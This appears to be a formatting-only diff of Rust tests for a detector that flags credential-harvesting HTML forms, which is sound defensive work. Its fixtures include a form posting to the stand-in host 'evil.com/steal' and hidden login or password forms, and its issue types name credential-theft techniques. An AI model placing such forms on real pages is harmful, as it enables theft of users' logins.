@@ -22,13 +22,13 @@ fn simple_form_no_issues() {
 
 #[test]
 fn detects_cross_origin_action() {
-    let body =
-        r#"<form action="https://evil.com/steal" method="post"><input type="text"></form>"#;
+    let body = r#"<form action="https://evil.com/steal" method="post"><input type="text"></form>"#;
     let issues = analyze_credential_harvest(body, "example.com");
-    assert!(issues.iter().any(|i| matches!(
-        i,
-        CredentialHarvestIssue::CrossOriginFormAction { .. }
-    )));
+    assert!(
+        issues
+            .iter()
+            .any(|i| matches!(i, CredentialHarvestIssue::CrossOriginFormAction { .. }))
+    );
 }
 
 #[test]
@@ -36,10 +36,11 @@ fn same_origin_no_cross_origin_issue() {
     let body =
         r#"<form action="https://example.com/login" method="post"><input type="text"></form>"#;
     let issues = analyze_credential_harvest(body, "example.com");
-    assert!(!issues.iter().any(|i| matches!(
-        i,
-        CredentialHarvestIssue::CrossOriginFormAction { .. }
-    )));
+    assert!(
+        !issues
+            .iter()
+            .any(|i| matches!(i, CredentialHarvestIssue::CrossOriginFormAction { .. }))
+    );
 }
 
 #[test]
@@ -72,8 +73,7 @@ fn detects_hidden_login_form_display_none() {
 
 #[test]
 fn detects_hidden_login_form_visibility_hidden() {
-    let body =
-        r#"<form style="visibility:hidden" action="/login"><input type="password"></form>"#;
+    let body = r#"<form style="visibility:hidden" action="/login"><input type="password"></form>"#;
     let issues = analyze_credential_harvest(body, "");
     assert!(issues.contains(&CredentialHarvestIssue::HiddenLoginForm));
 }
@@ -148,17 +148,26 @@ fn to_operations_creates_entries() {
 
 #[test]
 fn display_variants() {
-    assert_eq!(CredentialHarvestIssue::HiddenLoginForm.to_string(), "hidden_login_form");
+    assert_eq!(
+        CredentialHarvestIssue::HiddenLoginForm.to_string(),
+        "hidden_login_form"
+    );
     assert_eq!(
         CredentialHarvestIssue::PasswordFieldInHiddenContainer.to_string(),
         "hidden_password_field"
     );
-    assert_eq!(CredentialHarvestIssue::DataUriFormAction.to_string(), "data_uri_form_action");
+    assert_eq!(
+        CredentialHarvestIssue::DataUriFormAction.to_string(),
+        "data_uri_form_action"
+    );
     assert_eq!(
         CredentialHarvestIssue::JavascriptFormAction.to_string(),
         "javascript_form_action"
     );
-    assert_eq!(CredentialHarvestIssue::FormTargetBlank.to_string(), "form_target_blank");
+    assert_eq!(
+        CredentialHarvestIssue::FormTargetBlank.to_string(),
+        "form_target_blank"
+    );
     assert_eq!(
         CredentialHarvestIssue::SuspiciousFormInputNames.to_string(),
         "suspicious_input_names"
@@ -186,11 +195,11 @@ fn multiple_forms_all_checked() {
 
 #[test]
 fn no_cross_origin_without_site_domain() {
-    let body =
-        r#"<form action="https://example.com/login"><input type="text"></form>"#;
+    let body = r#"<form action="https://example.com/login"><input type="text"></form>"#;
     let issues = analyze_credential_harvest(body, "");
-    assert!(!issues.iter().any(|i| matches!(
-        i,
-        CredentialHarvestIssue::CrossOriginFormAction { .. }
-    )));
+    assert!(
+        !issues
+            .iter()
+            .any(|i| matches!(i, CredentialHarvestIssue::CrossOriginFormAction { .. }))
+    );
 }
